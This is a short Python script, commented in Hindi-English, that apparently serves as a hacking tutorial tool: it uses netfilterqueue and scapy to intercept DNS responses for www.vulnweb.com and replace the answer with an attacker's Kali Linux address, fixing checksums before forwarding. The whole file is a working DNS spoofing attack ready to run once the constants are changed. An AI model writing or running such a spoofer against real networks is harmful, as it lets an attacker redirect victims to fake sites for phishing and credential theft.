import netfilterqueue
import scapy.all as scapy

# 1. Target Website (Jise hum spoof karenge)
TARGET_WEBSITE = "www.vulnweb.com" 

# 2. Fake IP (Tumhare Kali Linux ka IP jahan tum target ko bhejna chahte ho)
# DHYAN RAHE: Ise apne Kali ke IP se change kar lena (ifconfig karke check kar lo)
FAKE_IP = "10.0.2.15"

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    
    # Check kya is packet mein DNS Response hai?
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname.decode("utf-8")
        
        # Kya target wahi website maang raha hai jo humne set ki hai?
        if TARGET_WEBSITE in qname:
            print(f"[+] Spoofing target: {qname} -> Redirecting to {FAKE_IP}")
            
            # Asli IP hata kar apna Fake IP (DNSRR) daal do
            answer = scapy.DNSRR(rrname=qname, rdata=FAKE_IP)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            
            # Purane checksum aur length delete karo taaki Scapy naye calculate kare
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum
            
            # Modified packet ko wapas set karo
            packet.set_payload(bytes(scapy_packet))
            
    # Packet ko aage jane do
    packet.accept()

print("[*] DNS Spoofer is running (Queue 0)...")
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
